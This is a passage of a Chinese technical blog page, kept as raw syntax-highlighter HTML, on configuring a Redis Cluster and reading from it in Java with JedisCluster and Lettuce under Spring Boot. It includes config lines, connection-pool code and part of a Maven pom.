class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nport 7000\r\ncluster-enabled yes\r\ncluster-config-file nodes.conf\r\ncluster-node-timeout 5000\r\nappendonly yes</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710542fe125424073-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542fe125424073-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710542fe125424073-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542fe125424073-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710542fe125424073-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710542fe125424073-1\"><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542fe125424073-2\"><span class=\"crayon-v\">cluster</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">enabled </span><span class=\"crayon-e\">yes</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710542fe125424073-3\"><span class=\"crayon-v\">cluster</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">config</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">file </span><span class=\"crayon-v\">nodes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542fe125424073-4\"><span class=\"crayon-v\">cluster</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">node</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5000</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710542fe125424073-5\"><span class=\"crayon-e\">appendonly </span><span class=\"crayon-v\">yes</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>注意：<br>\n（1）redis-cluster最小配置为三主三从，当1个主故障，大家会给对应的从投票，把从立为主，若没有从数据库可以恢复则redis群集就down了。<br>\n（2）在这个redis cluster中，如果你要在slave读取数据，那么需要带上readonly指令。redis cluster的核心的理念，主要是用slave做高可用的，每个master挂一两个slave，主要是做数据的热备，当master故障时的作为主备切换，实现高可用的。redis cluster默认是不支持slave节点读或者写的，跟我们手动基于replication搭建的主从架构不一样的。slave node要设置readonly，然后再get，这个时候才能在slave node进行读取。对于redis -cluster主从架构，若要进行读写分离，官方其实是不建议的，但也能做，只是会复杂一些。具体见下面的章节。<br>\n（3）redis-cluster的架构下，实际上本身master就是可以任意扩展的，你如果要支撑更大的读吞吐量，或者写吞吐量，或者数据量，都可以直接对master进行横向扩展就可以了。也扩容master，跟之前扩容slave进行读写分离，效果是一样的或者说更好。<br>\n（4）可以使用自带客户端连接：使用redis-cli -c -p cluster中任意一个端口，进行数据获取测试。</p>\n<p> </p>\n<h2>Java中对redis-cluster数据的一般读取方法简介</h2>\n<p> </p>\n<h3>使用Jedis读写redis-cluster的数据</h3>\n<p>由于Jedis类一般只能对一台redis-master进行数据操作，所以面对redis-cluster多台master与slave的群集，Jedis类就不能满足了。这个时候我们需要引用另外一个操作类：JedisCluster类。<br>\n例如我们有6台机器组成的redis-cluster：<br>\n172.20.52.85:7000、 172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005<br>\n其中master机器对应端口：7000、7004、7005<br>\nslave对应端口：7001、7002、7003</p>\n<p>使用JedisCluster对redis-cluster进行数据操作的参考代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054303189121841\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 添加nodes服务节点到Set集合\r\nSet&lt;HostAndPort&gt; hostAndPortsSet = new HashSet&lt;HostAndPort&gt;();\r\n// 添加节点\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7000));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7001));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7002));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7003));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7004));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7005));\r\n\r\n// Jedis连接池配置\r\nJedisPoolConfig jedisPoolConfig = new JedisPoolConfig();\r\njedisPoolConfig.setMaxIdle(100);\r\njedisPoolConfig.setMaxTotal(500);\r\njedisPoolConfig.setMinIdle(0);\r\njedisPoolConfig.setMaxWaitMillis(2000); // 设置2秒\r\njedisPoolConfig.setTestOnBorrow(true);\r\n\r\nJedisCluster jedisCluster = new JedisCluster(hostAndPortsSet ,jedisPoolConfig);\r\nString result = jedisCluster.get(\"event:10\");\r\nSystem.out.println(result);    </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054303189121841-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054303189121841-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-1\"><span class=\"crayon-c\">// 添加nodes服务节点到Set集合</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-2\"><span class=\"crayon-v\">Set</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">HostAndPort</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HashSet</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">HostAndPort</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-3\"><span class=\"crayon-c\">// 添加节点</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-4\"><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HostAndPort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"172.20.52.85\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-5\"><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HostAndPort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"172.20.52.85\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7001</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-6\"><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HostAndPort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"172.20.52.85\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7002</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-7\"><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HostAndPort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"172.20.52.85\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7003</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-8\"><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HostAndPort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"172.20.52.85\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7004</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-9\"><span class=\"crayon-v\">hostAndPortsSet</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HostAndPort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"172.20.52.85\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7005</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-11\"><span class=\"crayon-c\">// Jedis连接池配置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-12\"><span class=\"crayon-e\">JedisPoolConfig </span><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPoolConfig</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-13\"><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setMaxIdle</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-14\"><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setMaxTotal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">500</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-15\"><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setMinIdle</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-16\"><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setMaxWaitMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 设置2秒</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-17\"><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setTestOnBorrow</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-18\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-19\"><span class=\"crayon-e\">JedisCluster </span><span class=\"crayon-v\">jedisCluster</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisCluster</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">hostAndPortsSet</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">jedisPoolConfig</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054303189121841-20\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisCluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"event:10\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054303189121841-21\"><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0061 seconds] -->\r\n<p>运行结果截图如下图所示：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/2b46dc929c98de73ef48267e57352c6e.png\" alt=\"\"></p>\n<p>第一节中我们已经介绍了redis-cluster架构下master提供读写功能，而slave一般只作为对应master机器的数据备份不提供读写。如果我们只在hostAndPortsSet中只配置slave，而不配置master，实际上还是可以读到数据，但其内部操作实际是通过slave重定向到相关的master主机上，然后再将结果获取和输出。</p>\n<p>上面是普通项目使用JedisCluster的简单过程，若在spring boot项目中，可以定义JedisConfig类，使用@Configuration、@Value、@Bean等一些列注解完成JedisCluster的配置，然后再注入该JedisCluster到相关service逻辑中引用，这里介绍略。</p>\n<p> </p>\n<h3>使用Lettuce读写redis-cluster数据</h3>\n<p>Lettuce 和 Jedis 的定位都是Redis的client。Jedis在实现上是直接连接的redis server，如果在多线程环境下是非线程安全的，这个时候只有使用连接池，为每个Jedis实例增加物理连接，每个线程都去拿自己的 Jedis 实例，当连接数量增多时，物理连接成本就较高了。<br>\nLettuce的连接是基于Netty的，连接实例（StatefulRedisConnection）可以在多个线程间并发访问，应为StatefulRedisConnection是线程安全的，所以一个连接实例（StatefulRedisConnection）就可以满足多线程环境下的并发访问，当然这个也是可伸缩的设计，一个连接实例不够的情况也可以按需增加连接实例。<br>\n其中spring boot 2.X版本中，依赖的spring-session-data-redis已经默认替换成Lettuce了。<br>\n同样，例如我们有6台机器组成的redis-cluster：<br>\n172.20.52.85:7000、 172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005<br>\n其中master机器对应端口：7000、7004、7005<br>\nslave对应端口：7001、7002、7003<br>\n在spring boot 2.X版本中使用Lettuce操作redis-cluster数据的方法参考如下：<br>\n（1）pom文件参考如下：<br>\nparent中指出spring boot的版本，要求2.X以上：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054308045974720\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;parent&gt;\r\n &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n &lt;version&gt;2.0.4.RELEASE&lt;/version&gt;\r\n &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\r\n&lt;/parent&gt;\r\n&lt;!-- lookup parent from repository --&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054308045974720-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054308045974720-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054308045974720-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054308045974720-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054308045974720-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054308045974720-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054308045974720-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054308045974720-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-r\">parent</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054308045974720-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">springframework</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054308045974720-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">spring</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">starter</span><span class=\"crayon-o\">-</span><span class=\"crayon-r\">parent</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054308045974720-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">2.0.4.RELEASE</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054308045974720-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">relativePath</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lookup </span><span class=\"crayon-r\">parent</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">repository</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054308045974720-6\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-r\">parent</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054308045974720-7\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lookup </span><span class=\"crayon-r\">parent</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">repository</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n<p>依赖中需要加入spring-boot-starter-data-redis，参考如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67105430c504631424\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 